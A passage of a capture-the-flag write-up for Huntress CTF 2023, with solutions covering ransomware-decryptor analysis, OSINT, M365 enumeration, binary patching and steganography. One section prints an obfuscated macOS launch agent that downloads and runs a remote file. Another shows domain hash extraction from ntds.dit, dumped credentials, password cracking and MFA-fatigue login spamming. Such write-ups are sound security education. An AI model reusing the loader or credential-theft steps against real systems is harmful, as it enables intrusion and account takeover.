0000  66 6c 61 67 7b 62 65 34 37 33 38 37 61 62 37 37 32 35 31 65 63 66 38  flag{be47387ab77251ecf8
0017  30 64 62 31 62 36 37 32 35 64 64 37 61 63 7d                          0db1b6725dd7ac}    
```

## Black Cat II
I opened this one in `dnSpy v6.1.8 32-bit` to take a look at the source code. The program asks for a 64-bit key, and validates it, then calls `DecryptFiles(dir, key)`:

```c#
private void button1_Click(object sender, EventArgs e) {
  try {
    string directoryPath = this.fullPathToVictimFiles.Text.ToString().Trim();
    string text = this.keyInputTextBox.Text.ToString().Trim().ToLower();
    if (text == "") {
      MessageBox.Show("No key provided!");
    } else if (text.Length < 64) {
      MessageBox.Show("Key must be 64 chars");
    } else {
      MessageBox.Show("Running decryption routine...");
      DecryptorUtil.DecryptFiles(directoryPath, text);
      MessageBox.Show("Files decrypted!");
    }
  } catch (Exception ex) {
    MessageBox.Show("Error: " + ex.Message);
  }
}
```

The file decryption routine is as follows:

```c#
public static void DecryptFiles(string directoryPath, string decryptionKey) {
  string[] files = Directory.GetFiles(directoryPath, "*.encry");
  if (files.Length == 0) {
    return;
  }
  string text = null;
  foreach(string text2 in files) {
    string key;
    if (text == null) {
      key = decryptionKey;
    } else {
      key = DecryptorUtil.CalculateSHA256Hash(text);
    }
    string text3 = Path.Combine(directoryPath, Path.GetFileNameWithoutExtension(text2) + ".decry");
    DecryptorUtil.AESDecryptFile(text2, text3, key, DecryptorUtil.hardcodedIV);
    text = text3;
  }
  Console.WriteLine("[*] Decryption completed.");
}
```

Breaking it down, the function `DecryptFiles` performs the following:

1. Get a list of all files ending in `.encry` under the user-supplied directory
2. For the first pass, set the decryption key to the user-supplied `decryptionKey`
3. Determine the decrypted file's filename with the new `.decry` extension
4. Call `AESDecryptFile` with a hardcoded initialization vector (IV)
5. For the next file, instead of using the user-supplied key as the AES decryption key, it will use `second_file.decry` and run it through the function `CalculateSHA256Hash` to get the key.

The value of this hardcoded IV (found at the bottom of the script) is:

```
01 23 45 67 89 ab cd ef fe dc ba 98 76 54 32 10
```

The important parts of the `AESDecryptFile` are as follows:

```c#
byte[] key2 = DecryptorUtil.GenerateAesKeyFromPassword(key);
aes.Key = key2;
aes.IV = iv;
aes.Mode = CipherMode.CFB;
aes.Padding = PaddingMode.Zeros;
```

This indicates that the encryption algorithm is `AES-CFB`, is using a hardcoded IV which is the same for all files, and is zero-padded. The `GenerateAesKeyFromPassword` function is as follows:

```c#
private static byte[] GenerateAesKeyFromPassword(string password) {
  byte[] bytes = Encoding.UTF8.GetBytes("KnownSaltValue");
  byte[] result;
  using(Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, bytes, 10000, HashAlgorithmName.SHA256)) {
    byte[] bytes2 = rfc2898DeriveBytes.GetBytes(32);
    if (bytes2.Length != 32) {
      throw new InvalidOperationException("Derived key size is not valid for AES encryption.");
    }
    result = bytes2;
  }
  return result;
}
```

This indicates the key is derived by the `PBKDF2-SHA256` algorithm with a known salt value of `KnownSaltValue`, using 10,000 rounds.

But what about `CalculateSHA256Hash`? Remember, for every file except for the first, this function is run with the previous filename as a parameter. The code is as follows:

```c#
private static string CalculateSHA256Hash(string filePath) {
  string result;
  using(SHA256 sha = SHA256.Create()) {
    using(FileStream fileStream = File.OpenRead(filePath)) {
      result = BitConverter.ToString(sha.ComputeHash(fileStream)).Replace("-", "").ToLower();
    }
  }
  return result;
}
```

This code opens the file, reads and hashes its contents using `SHA-256`, removes any `-` character and converts to lowercase, and returns this.

Let's break it down. Assume we have two files that are getting decrypted:

```
file1.encry
file2.encry
```

In this case, `file1.encry` will be decrypted with the user supplied key and hardcoded IV. The program moves on to `file2.encry`, which it will decrypt using the same IV, but now the key is set to the SHA256 hashed contents of the now decrypted `file1.decry`.

So what if we can find out what the `SHA-256` hash of one of the original files are?

The directory of encrypted files is as follows:

```
10/05/2023  11:57 AM            75,488 A_Sunday_Afternoon_on_the_Island_of_La_Grande_Jatte_by_Georges_Seurat_5773ff06-a03e-401b-8914-6106bc277bfd_large.jpg.encry
10/05/2023  11:57 AM            84,640 Cafe_Terrace_at_Night_by_Vincent_van_Gogh_large.jpg.encry
10/05/2023  11:57 AM                96 flag.txt.encry
10/05/2023  11:57 AM            29,696 Guernica_by_Pablo_Picasso_large.jpg.encry
10/05/2023  11:57 AM            59,312 Impression_Sunrise_by_Claude_Monet_large.jpg.encry
10/05/2023  11:57 AM            12,432 Wanderer_above_the_Sea_of_Fog_by_Caspar_David_Friedrich_large.jpg.encry
```

Assuming the decryption routing ran through the files in alphanumeric order, `Cafe_Terrace_at_Night_by_Vincent_van_Gogh_large.jpg` would have been encrypted right before `flag.txt`. Because `flag.txt` was encrypted after that JPEG, it should have been encrypted with the key set to the SHA-256 contents of `Cafe_Terrace_at_Night_by_Vincent_van_Gogh_large.jpg`. Note that the hash is also passed through `GenerateAesKeyFromPassword` before being used to decrypt!

I found the original copy of Cafe Terrace online. What I did to force `flag.txt` to get decrypted was place it in the same directory, rename it to `Cafe_Terrace_at_Night_by_Vincent_van_Gogh_large.jpg.decry`, and remove all write permissions to this file so it wouldn't get overwritten by the decryptor. 

What happened:

1. The decryptor took whatever key I gave to it
2. It decrypted the first file with this wrong key
3. When it got to Cafe Terrace, it decrypted that too, but **could not write the wrong decrypted data to the `.decry` file!**
4. After "decrypting" Cafe Terrace, the program grabs its contents, which are the contents of the original Cafe Terrace now, and derives a key from that
5. The key we entered is no longer being used for anything at this point. The decryptor uses the correct Cafe Terrace contents, calculates its hash, derives an AES key from this hash, and successfully decrypts `flag.txt`

The result:

```
Keeping another flag here for safe keeping again! 

flag{03365961aa6aca589b59c683eecc9659}
```

## Under The Bridge
This was a geoguesser-style challenge. The way I solve these is looking for individual clues, such as:

- European license plates. Note the yellow ones, which are more common in northern Europe.
- English text on signage
- Shurgard sign (Storage unit company)
- Near a bridge
- White construction cranes very close by

I went to the Shurgard website and started looking at their locations. The first one I clicked on at random was the right one! It is the Shurgard in Kensington. 

## Operation Not Found
Same as [Under The Bridge](#under-the-bridge), I collected some clues:

- Sign for Brasfield and Gorrie contractors, a US company
- Photo dated 2019
- Many people with backpacks, all look young like students 

Their website had a listing of projects that they have been contracted to oversee, and I filtered for Education projects and found the exact building: [Georgia Institute of Technology Price Gilbert Library](https://www.brasfieldgorrie.com/expertise/project/georgia-institute-of-technology-price-gilbert-library-and-crosland-tower-renewal/)

## Where am I
This was a simple EXIF challenge:

```
$ exiftool PXL_20230922_231845140_2.jpg  | grep Description
Image Description               : ZmxhZ3tiMTFhM2YwZWY0YmMxNzBiYTk0MDljMDc3MzU1YmJhMik=
$ echo -n 'ZmxhZ3tiMTFhM2YwZWY0YmMxNzBiYTk0MDljMDc3MzU1YmJhMik=' | base64 -d
flag{b11a3f0ef4bc170ba9409c077355bba2)
```

## M365 General Info
This challenged asked for the Tenant's street address, which you can find with this command:

```
PS /home/user> Get-AADIntTenantDetails | Select -Property street

street
------
flag{dd7bf230fde8d4836917806aff6a6b27}
```

## M365 Conditional Access
This challenge asked to find strange conditional access policies. There was only one custom policy:

```
> Get-AADIntConditionalAccessPolicies | Select -Property displayName

displayName
-----------
flag{d02fd5f79caa273ea535a526562fd5f7}
```

## M365 Teams
This one stated we needed to find some sensitive data shared over a Teams message. Teams is Microsoft's extremely slow version of Slack.

```
> Get-AADIntTeamsMessages  | Select -Property Content

Content
-------
flag{f17cf5c1e2e94ddb62b98af0fbbd46e1}
```

## M365 The President
This one hints that an account has the flag in its account details.

```
> Get-AADIntUsers | Where-Object {$_.Title -eq "President"} | Select -Property PhoneNumber

PhoneNumber
-----------
flag{1e674f0dd1434f2bb3fe5d645b0f9cc3}
```

## PRESS PLAY ON TAPE
This is a reference to the tape loading of the Commodore 64. I used a utility to solve this:

```
wav2tap.exe pressplayontape.wav | c64tapedecode.exe -v
```

Inside was a basic file containing the flag:

```
C64File
"FLAG[32564872D760263D52929CE58CC40071]"  
```

## Welcome to the Park
This was a MacOS app directory. There was a hidden Mach-O file inside, which contained the following XML (it was Base64 encoded):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>com.huntress.ctf</string>
    <key>ProgramArguments</key>
    <array>
      <string>/bin/zsh</string>
      <string>-c</string>
      <string>A0b='tmp="$(m';A0bERheZ='ktemp /tmp/XX';A0bERheZX='XXXXXX)"';A0bER='; curl --';A0bE='retry 5 -f ';A0bERh='"https://';A0bERheZXDRi='gist.githu';xbER='b.com/s';juuQ='tuartjas';juuQQ7l7X5='h/a7d18';juuQQ7l7X5yX='7c44f4327';juuQQ7l7X5y='739b752d037be45f01';juuQQ7='" -o "${tmp}"; i';juuQQ7l7='f [[ -s "${tmp}';juuQQ7l7X='" ]];';juQQ7l7X5y=' then chm';juQQ7l='od 777 "${tmp}"; ';zRO3OUtcXt='"${tmp}"';zRO3OUt='; fi; rm';zRO3OUtcXteB=' "${tmp}"';echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB} | /bin/zsh</string>
    </array>
    <key>RunAtLoad</key>
    <true />
    <key>StartInterval</key>
    <integer>14400</integer>
  </dict>
</plist>
```

It seemed to contain a GitHub Gists URL which I reconstructed manually:

```
https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01
```

This contained a JPEG image of a person. At the very end of the file was the flag:

```
flag{680b736565c76941a364775f06383466}
```

## Indirect Payload
This was an instance-based challenge. When I visited the web page, there was a button that would take you through a massive amount of redirects. I tried to curl a few separately, and in one instance I saw this happen:

```
$ curl 'http://chal.ctf.games:30467/site/72deeb2a9ba9fb115580efd7a1bbde41.php' -i
HTTP/1.1 302 Found
Date: Sat, 28 Oct 2023 22:26:41 GMT
Server: Apache/2.4.38 (Debian)
Location: /site/cd6d46b9bc63ffca46fcea70f76459ea.php
Content-Length: 32
Content-Type: text/html; charset=UTF-8

character 9 of the payload is 0
```

Notice the redirection method is the `HTTP/1.1 302 Found` method. I wanted to see all of the messages regarding the payload so I first told curl to follow all redirects and print out a list of the files it was acessing:

```
$ curl -s 'http://chal.ctf.games:30467/site/flag.php' -i -L --max-redirs 2600 | grep Location | awk '{print $2}'
/site/fe3cbf06ef09be78eb8ae144888eeeae.php
/site/f99cc7e975c1fdfd1b803bd248bac515.php
/site/0eb108f40ad71158d396d396e825fab7.php
/site/e318c81f0211a5b17060ddab1fcc8fb0.php
/site/bdbbadb4fe344b998f98ca54c2e97b01.php
...
```

Then I wrote this Bash script to visit all of them:

```
#!/bin/bash
input="./files.txt"
while IFS= read -r line
do
  curl -s 'http://chal.ctf.games:30467/site/'$line
done < "$input"
```

The `files.txt` file just had a list of all the locations we were redirected to: 

```
$ cat files.txt 
fe3cbf06ef09be78eb8ae144888eeeae.php
f99cc7e975c1fdfd1b803bd248bac515.php
0eb108f40ad71158d396d396e825fab7.php
e318c81f0211a5b17060ddab1fcc8fb0.php
...
```

Running the script resulted in the flag:

```
$ ./grab.sh 
character 0 of the payload is f
character 1 of the payload is l
character 2 of the payload is a
character 3 of the payload is g
character 4 of the payload is {
character 5 of the payload is 4
character 6 of the payload is 4
character 7 of the payload is 8
character 8 of the payload is c
character 9 of the payload is 0
character 10 of the payload is 5
character 11 of the payload is a
character 12 of the payload is b
character 13 of the payload is 3
character 14 of the payload is e
character 15 of the payload is 3
character 16 of the payload is a
character 17 of the payload is 7
character 18 of the payload is d
character 19 of the payload is 6
character 20 of the payload is 8
character 21 of the payload is e
character 22 of the payload is 3
character 23 of the payload is 5
character 24 of the payload is 0
character 25 of the payload is 9
character 26 of the payload is e
character 27 of the payload is b
character 28 of the payload is 8
character 29 of the payload is 5
character 30 of the payload is e
character 31 of the payload is 8
character 32 of the payload is 7
character 33 of the payload is 2
character 34 of the payload is 0
character 35 of the payload is 6
character 36 of the payload is f
character 37 of the payload is }
```

```
flag{448c05ab3e3a7d68e3509eb85e87206f}
```

## MFatigue
This challenge presents two files, the `ntds.dit` and the `SYSTEM` registry hive. These files are commonly targeted for exfiltration by attackers as, combined, they can provide username and password hashes for an entire domain.

The first step is to extract these hashes, I used a tool called `DSInternals`:

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Install-Module -Name DSInternals
$key = Get-BootKey -SystemHiveFilePath 'C:\temp\SYSTEM'
Get-ADDBAccount -All -DBPath C:\temp\ntds.dit -BootKey $key
```

This produced a list of domain users/computers and their respective password hashes. I searched around and found one user, `JILLIAN_DOTSON` who was a member of the Organizational Unit `OU=Azure Admins`. This was the likely target for this challenge:

```
DistinguishedName: CN=JILLIAN_DOTSON,OU=T2-Accounts,OU=Azure Admins,OU=Admin,DC=huntressctf,DC=local
Sid: S-1-5-21-4105979022-1081477748-4060121464-1113
Guid: 5c189421-b7a6-43d3-aab7-3b8266351379
SamAccountName: JILLIAN_DOTSON
SamAccountType: User
UserPrincipalName: JILLIAN_DOTSON@huntressctf.local
PrimaryGroupId: 513
SidHistory: 
Enabled: True
UserAccountControl: NormalAccount
SupportedEncryptionTypes: 
AdminCount: True
Deleted: False
LastLogonDate: 
DisplayName: JILLIAN_DOTSON
GivenName: 
Surname: JILLIAN_DOTSON
Description: Created with secframe.com/badblood.
ServicePrincipalName: {POP3/FINWCTRX1000000, kafka/WIN-UUTKPJ98ERD}
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, 
DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-4105979022-1081477748-4060121464-512
Secrets
  NTHash: 08e75cc7ee80ff06f77c3e54cadab42a
  LMHash: 
  NTHashHistory: 
    Hash 01: 08e75cc7ee80ff06f77c3e54cadab42a
    Hash 02: 2f5ee1387c6dfb0c135921dfee0a04a1
  LMHashHistory: 
    Hash 01: a6a400e8045cf982acca2621b5d69db8
    Hash 02: ad24efc398c7c92eea67cac35c513034
  SupplementalCredentials:
    ClearText: 
    NTLMStrongHash: 7adb045e268602de23418782d92b45c2
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: 08b35b9d20fbc27c
      OldCredentials:
        DES_CBC_MD5
          Key: ef85619bb3869e3d
      Salt: HUNTRESSCTF.LOCALJILLIAN_DOTSON
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 4dae9a25539d7e2ac5aca833c2bf8ba765aafaa217b49e81a6a17e89a4cd0542
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 1d8a901df79ae247dbcdfd43a8921140
          Iterations: 4096
        DES_CBC_MD5
          Key: 08b35b9d20fbc27c
          Iterations: 4096
      OldCredentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 0426698dfbd65f6ba9308b16a76dc420cd0272a839c853273575e5a63a889d2d
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: d60054bf89236653318ed16cd99a73f2
          Iterations: 4096
        DES_CBC_MD5
          Key: ef85619bb3869e3d
          Iterations: 4096
      OlderCredentials:
      ServiceCredentials:
      Salt: HUNTRESSCTF.LOCALJILLIAN_DOTSON
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
      Hash 01: b64887fcf8dbe00c58be8c29aa26c5d8
      Hash 02: 49d32142ccc7093f5e92c9fcbdee438c
      Hash 03: b64887fcf8dbe00c58be8c29aa26c5d8
      Hash 04: b64887fcf8dbe00c58be8c29aa26c5d8
      Hash 05: bff1c68063f15236859fcc0d3f615c9e
      Hash 06: bff1c68063f15236859fcc0d3f615c9e
      Hash 07: 44b297565b815900de58e15e6fd5bc11
      Hash 08: 63562127348d5b193c088e2d9c1a1e8f
      Hash 09: a5e202d7cf16c06ad8c2f774a7fe91a3
      Hash 10: 2392a40ea2dd35a7a94973c97c5faa0a
      Hash 11: 2392a40ea2dd35a7a94973c97c5faa0a
      Hash 12: 63562127348d5b193c088e2d9c1a1e8f
      Hash 13: 63562127348d5b193c088e2d9c1a1e8f
      Hash 14: 5fde84e09a1ec178bbbe5eccf4421014
      Hash 15: 3b99c8dbbaf50adbb8dd216e2a1b64d8
      Hash 16: 593f7767385c892f19948838d755df7e
      Hash 17: 658ca2ff67cdfd97251613f8d34279bf
      Hash 18: eae2cc9a22cef4d508076b8514502e4f
      Hash 19: 73b96675099f466adbeaa5451511319b
      Hash 20: eae2cc9a22cef4d508076b8514502e4f
      Hash 21: 03a867a4de436a6c766dbe1261a624bd
      Hash 22: c19601ec3ef2b6fc7d6f63de6866711c
      Hash 23: 03a867a4de436a6c766dbe1261a624bd
      Hash 24: 82af100b5912700e336a726f7f24aeb8
      Hash 25: 189133f2dacbd488cd75a936b2a390e5
      Hash 26: 06f1130b84bdcd24785b4f7ab7d62732
      Hash 27: 214e98cadca09cf5b803589093cb0a4f
      Hash 28: a40bc69c7dd29d6b1a43302077a1606f
      Hash 29: 214e98cadca09cf5b803589093cb0a4f
Key Credentials:
Credential Roaming
  Created: 
  Modified: 
  Credentials: 
```

I cracked the hash for this account:

```
08e75cc7ee80ff06f77c3e54cadab42a -> katlyn99
```

And was therefore able to authenticate as this account in the Azure login page. The user had MFA enabled, but I repeatedly spammed logins until the simulated Azure admin accepted one out of exhaustion, which gave me the flag:

```
flag{9b896a677de35d7dfa715a05c25ef89e} 
```

## Rock Paper Psychic
This challenge was a binary that simulates a game of Rock, Paper, Scissors with a computer. The computer is programmed to always beat you no matter what you choose. The Ghidra disassembly for the main function is:

```c
void main__main_62(undefined8 param_1,undefined8 param_2,undefined8 param_3,ulonglong param_4)

{
  ulonglong *puVar1;
  longlong *plVar2;
  ulonglong uVar3;
  
  echoBinSafe(&TM__V45tF8B8NBcxFcjfe7lhBw_2,1);
  nossleep(1000);
  echoBinSafe(&TM__V45tF8B8NBcxFcjfe7lhBw_4,1);
  nossleep(1000);
  echoBinSafe(&TM__V45tF8B8NBcxFcjfe7lhBw_6,1);
  nossleep(1000);
  echoBinSafe(&TM__V45tF8B8NBcxFcjfe7lhBw_8,1);
  nossleep(1000);
  echoBinSafe(&TM__V45tF8B8NBcxFcjfe7lhBw_10,1);
  nossleep(1000);
  echoBinSafe(&TM__V45tF8B8NBcxFcjfe7lhBw_12,1);
  do {
    while( true ) {
      echoBinSafe(&TM__V45tF8B8NBcxFcjfe7lhBw_14,1);
      puVar1 = readLineFromStdin__impureZrdstdin_1(&TM__V45tF8B8NBcxFcjfe7lhBw_16);
      puVar1 = nuctoLowerStr(puVar1);
      if (puVar1 != 0x0) break;
LAB_00416b9d:
      echoBinSafe(&TM__V45tF8B8NBcxFcjfe7lhBw_20,1);
    }
    uVar3 = *puVar1;
    if (uVar3 == 4) {
      if (*(puVar1 + 2) == 0x6b636f72) goto LAB_00416bbd;
      goto LAB_00416b9d;
    }
    if (uVar3 != 5) {
      if ((uVar3 == 8) && (puVar1[2] == 0x73726f7373696373)) goto LAB_00416bbd;
      goto LAB_00416b9d;
    }
    if ((*(puVar1 + 2) != 0x65706170) || (*(puVar1 + 0x14) != 'r')) goto LAB_00416b9d;
LAB_00416bbd:
    plVar2 = getComputerChoice__main_55(puVar1);
    echoBinSafe(&TM__V45tF8B8NBcxFcjfe7lhBw_22,1);
    uVar3 = determineWinner__main_58(puVar1,plVar2);
    if (uVar3 == '\0') {
      playerWins__main_10(puVar1,plVar2,param_3,param_4);
      randomize__pureZrandom_277();
      main__main_62(puVar1,plVar2,param_3,param_4);
      return;
    }
    computerWins__main_11();
    puVar1 = readLineFromStdin__impureZrdstdin_1(&TM__V45tF8B8NBcxFcjfe7lhBw_50);
    puVar1 = nuctoLowerStr(puVar1);
    if (((puVar1 == 0x0) || (*puVar1 != 3)) || (*(puVar1 + 2) != 0x6579)) {
      return;
    }
    if (*(puVar1 + 0x12) != 's') {
      return;
    }
  } while( true );
}
```

The important part of the function is:

```c
uVar3 = determineWinner__main_58(puVar1,plVar2);
if (uVar3 == '\0') {
  playerWins__main_10(puVar1,plVar2,param_3,param_4);
  randomize__pureZrandom_277();
  main__main_62(puVar1,plVar2,param_3,param_4);
  return;
}
```

The corresponding assembly is:

```assembly
CALL     determineWinner__main_58
TEST     AL, AL
JNZ      LAB_00416c6a
CALL     computerWins__main_11
```

To solve this, I simply patched the `JNZ` instruction to its opposite, `JZ`. In Ghidra, to patch an instruction, just right click it and press `Patch Instruction`. This jumps to  `LAB_00416c6a`:

```assembly
CALL playerWins__main_10
```

Now when I run the program:

```
[#] Wait, how did you do that??!! Cheater! CHEATER!!!!!!
[+] flag{35bed450ed9ac9fcb3f5f8d547873be9}
```

## Land Before Time
This challenge was a PNG file that was likely used to hide something else with a password. The prompt was:

```
This trick is nothing new, you know what to do: iSteg. Look for the tail that's older than time, this Spike, you shouldn't climb. 
```

I learned of a cool tool doing this one: [stego-toolkit](https://github.com/DominicBreuker/stego-toolkit). I didn't want to install anything new on my system so I just ran this docker command and worked from there and deleted the image when I was done!

Unfortunately the tools in here didn't work so I had to download the iSteg Java Application and run it. There was no password:

```
>> Steg file selected: "C:\Users\REM\Desktop\dinosaurs1.png"
>> Oparation completed successfully.
>> Here is the message:
flag{da1e2bf9951c9eb1c33b1d2008064fee}
```

## Results
|Challenge|Category|Value|Time|
|--- |--- |--- |--- |
|HumanTwo|Malware|50|2023-10-26T20:43:15.306062|
|Opendir|Malware|50|2023-10-27T04:21:32.360604|
|Operation Eradication|Miscellaneous|50|2023-10-27T05:20:58.219980|
|RAT|Malware|50|2023-10-30T04:00:11.190491|
|Snake Oil|Malware|50|2023-10-28T23:12:00.619334|
|Traffic|Forensics|50|2023-10-26T17:57:27.045155|
|VeeBeeEee|Malware|50|2023-10-27T04:12:38.426078|
|Wimble|Forensics|50|2023-10-26T01:09:50.341731|
|Zerion|Malware|50|2023-10-27T15:28:10.771693|
|Read The Rules|Warmups|50|2023-10-27T02:22:08.619734|
|Thumb Drive|Malware|50|2023-10-29T00:36:42.697116|
|Who is Real?|Miscellaneous|50|2023-10-27T02:23:53.926271|
|Query Code|Warmups|50|2023-10-27T02:22:49.189874|
|Dialtone|Warmups|50|2023-10-27T02:21:24.943867|
|Babel|Miscellaneous|50|2023-10-30T04:26:15.302384|
|Bad Memory|Forensics|50|2023-10-26T19:06:06.948692|
|Baking|Warmups|50|2023-10-27T01:57:47.643390|
|BaseFFFF+1|Warmups|50|2023-10-27T01:54:21.070324|
|Book By Its Cover|Warmups|50|2023-10-27T01:43:23.919023|
|CaesarMirror|Warmups|50|2023-10-25T23:45:11.868562|
|Chicken Wings|Warmups|50|2023-10-25T23:34:16.107442|
|Comprezz|Warmups|50|2023-10-25T23:10:48.349657|
|Dumpster Fire|Forensics|50|2023-10-26T01:00:48.454468|
|F12|Warmups|50|2023-10-25T22:55:33.366499|
|Indirect Payload|Miscellaneous|50|2023-10-28T22:34:51.639979|
|Layered Security|Warmups|50|2023-10-25T23:05:27.844770|
|Notepad|Warmups|50|2023-10-25T23:02:15.201740|
|Opposable Thumbs|Forensics|50|2023-10-26T00:41:25.668922|
|PHP Stager|Malware|50|2023-10-26T20:08:58.592515|
|String Cheese|Warmups|50|2023-10-25T23:01:33.669462|
|Technical Support|Warmups|50|2023-10-27T03:00:31.221472|
|Tragedy|Forensics|50|2023-10-25T23:48:35.821756|
|Backdoored Splunk|Forensics|50|2023-10-26T18:13:45.812295|
|Where am I?|OSINT|50|2023-10-27T01:32:58.523825|
|Operation Not Found|OSINT|50|2023-10-27T01:29:30.017660|
|I Wont Let You Down|Miscellaneous|50|2023-10-27T02:29:09.193122|
|Land Before Time|Steganography|50|2023-10-27T03:49:44.370821|
|Under The Bridge|OSINT|50|2023-10-27T01:12:44.234562|
|Rogue Inbox|Forensics|50|2023-10-26T17:57:35.421417|
|BlackCat|Malware|50|2023-10-27T00:01:40.887051|
|Discord Snowflake Scramble|Miscellaneous|50|2023-10-30T05:11:45.120547|
|Snake Eater|Malware|50|2023-10-30T22:02:13.325102|
|Welcome to the Park|Miscellaneous|50|2023-10-27T03:28:02.588658|
|MFAtigue|Miscellaneous|50|2023-10-30T05:45:37.631666|
|Snake Eater II|Malware|50|2023-10-31T00:50:47.592593|
|Rock, Paper, Psychic|Miscellaneous|50|2023-10-31T00:27:10.552937|
|Hot Off The Press|Malware|50|2023-10-29T02:11:20.974631|
|Speakfriend|Malware|50|2023-10-28T23:58:28.564069|
|BlackCat II|Malware|310|2023-10-30T20:37:35.865457|
|PRESS PLAY ON TAPE|Miscellaneous|50|2023-10-27T02:56:55.741866|
|M Three Sixty Five - Conditional Access|Miscellaneous|50|2023-10-27T02:34:48.520259|
|M Three Sixty Five - Teams|Miscellaneous|50|2023-10-27T02:36:49.021424|
|M Three Sixty Five - The President|Miscellaneous|50|2023-10-27T02:41:11.002344|
|M Three Sixty Five - General Info|Miscellaneous|50|2023-10-27T02:33:18.006880|
|Texas Chainsaw Massacre: Tokyo Drift|Forensics|50|2023-10-25T22:51:26.146723|
|Crab Rave|Malware|183|2023-10-31T18:09:53.970074|
|Tragedy Redux|Forensics|50|2023-10-26T05:18:53.720503|
